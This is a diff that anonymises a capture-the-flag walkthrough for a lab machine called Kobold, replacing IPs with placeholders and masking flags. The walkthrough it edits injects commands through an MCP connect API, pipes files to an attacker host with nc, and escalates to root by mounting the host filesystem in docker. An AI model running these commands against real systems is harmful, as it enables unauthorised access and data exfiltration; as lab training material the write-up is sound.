@@ -17,7 +17,7 @@
 ## Overview
 
 **Machine:** Kobold  
-**IP:** 10.129.7.176  
+**IP:** <TARGET_IP>  
 **Difficulty:** Easy  
 **OS:** Linux  
 
@@ -33,13 +33,13 @@
 ### 1. Add Host to /etc/hosts
 
 ```bash
-sudo echo "10.129.7.176 kobold.htb mcp.kobold.htb" >> /etc/hosts
+sudo echo "<TARGET_IP> kobold.htb mcp.kobold.htb" >> /etc/hosts
 ```
 
 ### 2. Nmap Scan
 
 ```bash
-nmap -sC -sV -p- --min-rate=1000 10.129.7.176
+nmap -sC -sV -p- --min-rate=1000 <TARGET_IP>
 ```
 
 **Results:**
@@ -63,7 +63,7 @@ Basic nginx setup - vhost discovery needed.
 ### 2. Arcane Service (Port 3552)
 
 ```bash
-curl -s http://10.129.7.176:3552/api/openapi.json | head -100
+curl -s http://<TARGET_IP>:3552/api/openapi.json | head -100
 ```
 
 **Discovered:** Arcane Docker Management v1.13.0
@@ -71,7 +71,7 @@ curl -s http://10.129.7.176:3552/api/openapi.json | head -100
 ### 3. Subdomain Enumeration
 
 ```bash
-ffuf -u http://10.129.7.176 -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0
+ffuf -u http://<TARGET_IP> -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0
 ```
 
 **Discovered:** mcp.kobold.htb
@@ -116,7 +116,7 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -d '{
     "serverConfig": {
       "command": "bash",
-      "args": ["-c", "id | nc 10.10.14.248 9001"],
+      "args": ["-c", "id | nc <YOUR_IP> 9001"],
       "env": {}
     },
     "serverId": "test"
@@ -140,14 +140,14 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -d '{
     "serverConfig": {
       "command": "bash",
-      "args": ["-c", "cat /home/ben/user.txt | nc 10.10.14.248 9001"],
+      "args": ["-c", "cat /home/ben/user.txt | nc <YOUR_IP> 9001"],
       "env": {}
     },
     "serverId": "user"
   }'
 ```
 
-**User Flag:** `10ff89dbd16ef67da5b63f58476f1c9b`
+**User Flag:** `10ff89dbd16ef67d████████████████`
 
 ### Step 3: Check Group Membership
 
@@ -161,7 +161,7 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -d '{
     "serverConfig": {
       "command": "bash",
-      "args": ["-c", "id | nc 10.10.14.248 9001"],
+      "args": ["-c", "id | nc <YOUR_IP> 9001"],
       "env": {}
     },
     "serverId": "idcheck"
@@ -190,7 +190,7 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -d '{
     "serverConfig": {
       "command": "sg",
-      "args": ["docker", "-c", "docker images | nc 10.10.14.248 9001"],
+      "args": ["docker", "-c", "docker images | nc <YOUR_IP> 9001"],
       "env": {}
     },
     "serverId": "docker"
@@ -218,7 +218,7 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -d '{
     "serverConfig": {
       "command": "sg",
-      "args": ["docker", "-c", "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10 10.10.14.248 9001"],
+      "args": ["docker", "-c", "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10 <YOUR_IP> 9001"],
       "env": {}
     },
     "serverId": "rootflag"
@@ -240,12 +240,12 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 
 ### User Flag
 ```
-10ff89dbd16ef67da5b63f58476f1c9b
+10ff89dbd16ef67d████████████████
 ```
 
 ### Root Flag
 ```
-cfffff370705c650311f83107de22568
+cfffff370705c650████████████████
 ```
 
 ---
